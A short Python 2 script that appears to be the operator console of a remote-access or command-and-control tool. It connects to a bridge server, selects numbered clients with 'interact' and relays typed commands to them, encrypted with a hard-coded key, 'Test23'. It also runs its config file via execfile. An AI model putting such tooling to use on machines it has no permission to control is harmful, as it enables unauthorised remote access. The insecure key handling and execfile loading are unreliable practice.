#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
from ConfigParser import SafeConfigParser
import os
import sys
import time
from socket import *

from api import *
from encryption import *

config = {}
execfile("Control.conf", config) 	
	
class control():

	def main(self):
		try:
			s=socket(AF_INET, SOCK_STREAM)
			s.connect((config["server"],config["port"]))
		except Exception as e:
			sys.exit(e)

		login = {'password': args.password}
		login = Encode().process(login)
		login = encryption().encrypt(login, "Test23")
		s.send(login)

		while True:
			command = raw_input("$")
			try:
				if(command == "clear"):
					if sys.platform == 'win32': os.system("cls")
					else: os.system("clear")
				elif(command == "help"):
					print config["allcommands"]
				elif("interact" in command):
					answers = command.split(' ')
					if len(answers) == 1:
						client = raw_input(" [?] Client Number:")
						Cmd = {"command": command, "client":client}
					else: Cmd = {"command": answers[0], "client":answers[1]} 
					Cmd = Encode().process(Cmd)
					Cmd = encryption().encrypt(Cmd, "Test23")
					s.send(Cmd)
					reply = s.recv(20480)
					reply = encryption().decrypt(reply, "Test23")
					Reply = Decode().process(reply)
					print str(Reply)

				else:
					Cmd = {'command': command}
					Cmd = Encode().process(Cmd)
					Cmd = encryption().encrypt(Cmd, "Test23")
					s.send(Cmd)
					reply = s.recv(20480)
					reply = encryption().decrypt(reply, "Test23")
					Reply = Decode().process(reply)
					print str(Reply)

			except KeyboardInterrupt:
				try:
					s.send("quit")
					s.close()
					print " [!] Connection Closed"
					break
				except:
					pass
			except Exception as e:
				print e
				print " [!] Connection Closed"
				s.close()
				break

if __name__=="__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-p", "--password", type=str, help="Bridge Connection Password", required = True)
	parser.add_argument('-v', '--version', action='version', version=' [+] Version: 1.0')
	args = parser.parse_args()
	if sys.platform == 'win32': os.system("cls")
	else: os.system("clear")
	print config["intro"]
	control().main()
